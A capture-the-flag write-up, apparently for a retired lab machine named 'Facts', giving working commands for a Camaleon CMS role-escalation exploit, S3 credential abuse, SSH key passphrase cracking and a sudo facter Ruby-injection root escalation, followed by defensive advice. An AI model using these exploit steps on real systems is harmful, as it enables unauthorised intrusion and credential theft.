---
title: "Facts"
machine: "Facts"
status: retired
os: Linux
difficulty: Medium
ownedUser: true
ownedRoot: true
date: 2026-05-10
techniques:
  - "Broken access control"
  - "S3 enum (MinIO)"
  - "SSH key crack"
  - "sudo facter abuse"
  - "Ruby custom-fact RCE"
cves:
  - "CVE-2025-2304"
summary: "Camaleon CMS CVE-2025-2304 escalates any registered user to admin; exposed S3 credentials unlock a home-directory backup with an SSH key; and a lazy sudo policy on facter grants root through a Ruby custom-fact injection."
proof: "/proof/facts.png"
draft: false
---

## Summary

Facts is a compact Medium box that models one of the more common
enterprise attack chains of 2025: a broken-access-control bug in a
lightweight CMS (`Camaleon CMS`), a locally hosted S3-compatible store
(MinIO on port 54321) full of over-scoped credentials, and a sudo
policy on a systems-tooling binary that assumes "we only trust our
admins to use this responsibly."

An unauthenticated attacker who registers a public account reaches root
in **under ten minutes**.

## Reconnaissance

```bash
nmap -sC -sV -p- 10.129.X.X
```

Three services return:

| Port      | Service                            | Notes                       |
|-----------|------------------------------------|-----------------------------|
| 22/tcp    | OpenSSH 9.9p1                      |                             |
| 80/tcp    | nginx 1.26.3                       | Redirects to `facts.htb`    |
| 54321/tcp | Go net/http (S3-compatible API)    | XML `AccessDenied` = MinIO  |

Add the vhost and browse to `http://facts.htb`. The site is a trivia
platform on **Camaleon CMS v2.9.0** with an open registration form.

> **Tip — recognising an S3-compatible service.** An HTTP response body
> like `<Error><Code>AccessDenied</Code>...</Error>` on an unusual port
> is almost always MinIO, Ceph RGW, or another S3-compatible gateway.
> The protocol is the tell, not the port.

## CVE-2025-2304 — Broken Access Control

Reading the Camaleon CMS 2.9.0 source, the `Admin::UsersController#updated_ajax`
action does not verify that the caller is an admin before applying the
submitted `password[role]` value. Any authenticated user can promote
themselves — this is the class of bug that turns "self-registration is
fine, it only creates low-privilege accounts" into "self-registration
is admin".

### Step 1 — Register

```
POST /admin/join
username=johnr&email=johnr@facts.htb&password=johnr123&...
```

### Step 2 — Escalate

Grab a CSRF token from `/admin/profile/edit`, extract your `user_id`
from the same page, then:

```bash
curl -s -X POST http://facts.htb/admin/users/<user_id>/updated_ajax \
  -H "X-CSRF-Token: <csrf>" \
  -H "X-Requested-With: XMLHttpRequest" \
  --cookie "<session>" \
  -d "_method=patch&password[password]=x&password[password_confirmation]=x&password[role]=admin"
```

Refreshing `/admin/settings/site` now succeeds. Buried in the site
settings form is a plaintext render of the S3 access key, secret key,
and endpoint pointing back at `http://localhost:54321`.

> **Danger — never render secrets into HTML.** Every "just this once,
> so admins can copy it" secret rendered into an HTML `<input>` is one
> broken access control bug away from being an internet-wide leak.
> Mask on the server, expose behind an authenticated reveal endpoint
> at most.

## S3 Enumeration → SSH Key

```bash
aws configure --profile facts   # paste the leaked access/secret
aws --endpoint-url http://10.129.X.X:54321 \
    --profile facts s3 ls
aws --endpoint-url http://10.129.X.X:54321 \
    --profile facts s3 ls s3://internal --recursive
```

The `internal` bucket contains a home-directory backup for the `trivia`
user, including `.ssh/id_ed25519` and `.ssh/authorized_keys`.

```bash
aws --endpoint-url http://10.129.X.X:54321 \
    --profile facts s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```

## User — Cracking the SSH Passphrase

The private key is passphrase-encrypted (`aes256-ctr`) — but the
passphrase is a common dictionary word.

```bash
ssh2john id_ed25519 > ssh.hash
hashcat -m 22931 ssh.hash /usr/share/wordlists/rockyou.txt

ssh-keygen -p -P '<passphrase>' -N "" -f id_ed25519
chmod 600 id_ed25519
ssh -i id_ed25519 trivia@10.129.X.X
```

You are `trivia`, and the user proof lives inside your home directory.

## Root — `facter` Custom-Dir Ruby Injection

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

`facter` is a Ruby system-facts tool. Its `--custom-dir` flag loads
any `.rb` file in that directory and executes it as part of fact
resolution — which, because `sudo`, means as root.

```bash
mkdir -p /tmp/facts_evil
cat > /tmp/facts_evil/pwn.rb <<'RB'
Facter.add('pwn') do
  setcode do
    `cat /root/root.txt`   # any shell command runs as root
  end
end
RB

sudo /usr/bin/facter --custom-dir /tmp/facts_evil pwn
```

The output is your root proof. From here, a real engagement would drop
a SUID shell, add an SSH key to `/root/.ssh/authorized_keys`, or open
a reverse shell.

## Attack Chain Summary

1. `nmap` → nginx + MinIO S3 on 54321
2. Register → `client` role
3. CVE-2025-2304 → self-promote to admin
4. Admin settings → S3 creds in plaintext
5. `aws-cli --endpoint-url` → dump `s3://internal`
6. Recover `id_ed25519` → `ssh2john` + `hashcat -m 22931`
7. SSH as `trivia` → user proof
8. `sudo -l` → `facter` NOPASSWD
9. `facter --custom-dir <ruby>` → root RCE

## Takeaways

- **Broken access control keeps winning.** OWASP put it at the top of
  the Top 10 for a reason — `updated_ajax` is exactly the shape of the
  bug that keeps producing critical CVEs.
- **"Local" storage is not private.** MinIO on `localhost` is only
  local from the box's own perspective; anything that reaches
  userland reaches the endpoint.
- **`sudo <binary>` audits must include the binary's plugin surface.**
  `facter --custom-dir`, `find -exec`, `awk 'BEGIN{system(...)}'` —
  all are one flag away from arbitrary code execution.

## Defensive Perspective

- **Patch Camaleon CMS** past 2.9.0 and validate role changes
  server-side against the caller's own role. A single `pundit`-style
  policy would have blocked the bug.
- **Rotate the exposed access key** the moment you know it landed in
  HTML.
- **Restrict MinIO to `127.0.0.1`** and prefer STS-scoped temporary
  credentials for application access. Never share a long-lived key
  between "the app talks to S3" and "the backup job talks to S3".
- **Bucket policies** should deny reads of any path matching `*.ssh/*`
  and enforce SSE-KMS on all backup data.
- **Remove `facter` from sudoers.** If the operator needs it, wrap it
  in a script that hardcodes `--custom-dir` to a root-owned,
  non-user-writable path and sudo the wrapper — not the binary.

## References

- [OWASP Top 10 A01 — Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [GTFOBins — facter](https://gtfobins.github.io/gtfobins/facter/)
- [hashcat modes — 22931 SSH ed25519](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [MITRE ATT&CK T1552.004 — Private Keys](https://attack.mitre.org/techniques/T1552/004/)
